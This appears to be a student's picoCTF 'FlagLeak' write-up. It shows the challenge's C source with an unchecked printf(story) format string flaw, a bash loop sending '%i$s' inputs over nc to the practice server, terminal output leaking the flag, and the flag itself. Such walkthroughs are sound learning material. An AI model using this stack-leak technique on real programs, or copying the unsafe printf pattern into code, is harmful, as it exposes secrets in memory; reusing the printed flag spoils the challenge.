# FlagLeak
flag : picoCTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}

## My Approach :

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```

Asking ChatGPT to explain the code, I realised that there is a format string vulnerability. There is no "%s".          
I absolutely despise unnecessarily having to read long codes, so lemme just zoom in on the vulnerability.

![image](https://github.com/user-attachments/assets/91ac11b4-18b6-4037-adb6-f2f05bb3aaa5)          

A big hint is that the function is called "vuln". It also calls to readflag, so well, it reads the flag. Then it accepts an entry from the user, without a format specifier (VULNERABILITY!!!!!)

So, I used :
```
for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 64582; done
```
to traverse thru the memory stack at various index positions until I found my flag.
- This loop tries %1$s, %2$s, and so on, as input to the program.
- When it reaches the index where the flag is stored, printf interprets it as a string and prints the flag.




## Terminal Output : 
```
avantikasanyal@LAPTOP-CFRE3HMA:~$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 64582; done
Tell me a story and then I'll tell you one >> Here's a story -
%0$s
Tell me a story and then I'll tell you one >> Here's a story -
%1$s
Tell me a story and then I'll tell you one >> Here's a story -
[�
Tell me a story and then I'll tell you one >> Here's a story -
�ú,
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
/
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
�.
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
�������
Tell me a story and then I'll tell you one >> Here's a story -
�(��g���g���g���g���g���g���g���h���
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
setresgid
Tell me a story and then I'll tell you one >> Here's a story -
����
Tell me a story and then I'll tell you one >> Here's a story -
��e�

Tell me a story and then I'll tell you one >> Here's a story -
setresgid
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
CTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}
Tell me a story and then I'll tell you one >> Here's a story -
�J�
Tell me a story and then I'll tell you one >> Here's a story -
ii
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
ii
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
$�
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
�(��g���g���g���g���g���g���g���h���
Tell me a story and then I'll tell you one >> Here's a story -
����������؉ǀ�u��^H�C�p��s��u��C
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
���9��p����m�������1����
Tell me a story and then I'll tell you one >> Here's a story -
������
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
��D���C�0�'�S)�@-/��q)�M$��y)�pV)��Э'�1/�
Tell me a story and then I'll tell you one >> Here's a story -
```
## What did I learn?

### 1. String vulnerabilities
- The program uses scanf("%127s", story) to accept your input into the story variable.
- Then it directly passes story to printf(story).
- Normally, printf expects format specifiers like %s or %d in its argument to interpret data correctly.
- By providing your own format specifiers (e.g., %x, %s), you gain control over what printf does.
  
### 2. How did I make use of this?

- When printf processes format specifiers, it accesses values from the memory stack.
- You can use %p to print raw pointers or %s to print strings at specific memory addresses.
- %i$s allows you to specify an index (i) to directly access a specific location on the stack and interpret it as a string.

  ### 3. Why %i$s Works.
%i$s is a positional format specifier in printf. It accesses the ith argument on the stack as a string.
By systematically testing indices, you find the one that corresponds to the memory location of the flag.

## Errors :
  None really, very simply asked ChatGPT to guide me thru the code for my terminal and to highlight where there might be a weak link in my source code.
